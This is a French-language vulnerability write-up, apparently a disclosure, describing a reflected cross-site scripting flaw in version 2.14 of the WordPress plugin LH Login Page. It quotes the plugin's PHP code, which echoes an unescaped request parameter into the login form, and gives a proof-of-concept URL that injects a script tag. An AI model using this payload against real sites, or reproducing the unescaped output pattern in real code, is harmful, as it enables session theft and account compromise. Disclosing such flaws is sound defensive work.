---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress LH Login Page"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [LH Login Page](https://wordpress.org/plugins/lh-login-page) (slug: `lh-login-page`) se présente de cette façon :

> This plugin provides a shortcode to include a HTML5 login form on a page on your website and will natively link to this form throughout your site. You can configure the plugin to select whether you prefer to use email addresses or user names for your users to login.
> 
> On activation a page with the shortcode [lh_login_page_form] will be created o0n your site, and it will become your front end login page.
> 
> To change the login url to a page where you have the front end form navigate to Wp Admin->Settings->LH Login Page and paste the page id into the field.
> 
> Features:
>
> * Front end login form inserted via shortcode
> * Option to login using an email address rather than username
> * Multiple instances possible: Place login form shortcode multiple pages or in sidebars and widgets
> * Ability to specify a custom url to which users will be redirected on logon
> * If configured will override the WordPress login url so that login links point to to your front end login page (extra security)

La version testée est la 2.14 et date d'il y a 4 ans au moment de ces lignes.

## La vulnérabilité

Les classes PHP nécessaires au plugin sont présentes dans le fichier `lh-login-page.php`.

On y trouve une méthode `lh_login_page_form_output` destinée à générer le code HTML de la page de login :

```php
function lh_login_page_form_output($return_string, $redirect_to){                                              
    if(isset($_GET['login']) && $_GET['login'] == 'failed'){                                                   
        $return_string .=  LH_login_page_plugin::login_header( 'Login failed', __( 'Login failed: You have entered an incorrect email or password, please try again.', $this->namespace ));
    }                                                                                                          
                                                                                                               
    $return_string .= '<form name="lh_login_page-login_form" id="lh_login_page-login_form" action="" method="post" accept-charset="utf-8" data-lh_login_page-nonce="'.wp_create_nonce("lh_login_page-nonce").'" data-lh_login_page-rest_nonce="'.wp_create_nonce( 'wp_rest' ).'" data-lh_login_page-login-user-url="'.$this->return_rest_login_url().'"> <noscript>'.__( 'Please switch on Javascript to enable this registration', $this->namespace ).'</noscript> ';                                                                            
                                                                                                               
    if (isset($this->options[$this->use_email_field_name]) and ($this->options[$this->use_email_field_name] == 1)){
                                                                                                               
        $return_string .= '<p>                                                                                 
            <!--[if lt IE 10]><br/><label for="lh_login_page-user_login">'.__( 'Email', $this->namespace ).'</label><br/><![endif]--><input type="email" id="lh_login_page-user_login" name="lh_login_page-user_login" placeholder="yourname@email.com" required="required"  ';                                                 
    } else {                                                                                                   
        $return_string .= '<p> <!--[if lt IE 10]><br/><label for="lh_login_page-user_login">'.__( 'User name', $this->namespace ).'</label><br/><![endif]--> <input type="text" id="lh_login_page-user_login" name="lh_login_page-user_login" placeholder="your username" required="required"  ';                               
    }                                                                                                          
                                                                                                               
    if (isset($_POST['lh_login_page-user_login'])){                                                            
        $return_string .= ' value="'.$_POST['lh_login_page-user_login'].'"';                                   
    } elseif (isset($_GET['lh_login_page-user_login'])){                                                       
        $return_string .= ' value="'.$_GET['lh_login_page-user_login'].'"';                                    
    }
    --- snip ---
    return $return_string;
}
```

On remarque que le paramètre `lh_login_page-user_login` est pris tel quel pour être affiché dans la page, ouvrant la voie à l'injection de code HTML et Javascript.

PoC : une fois l'adresse de la page de login identifiée (lien `Login Page` sur la page d'index), il suffit de procéder à l'injection dans `lh_login_page-user_login` :

```
http://localhost:8000/?page_id=5&lh_login_page-user_login=%22/%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
```
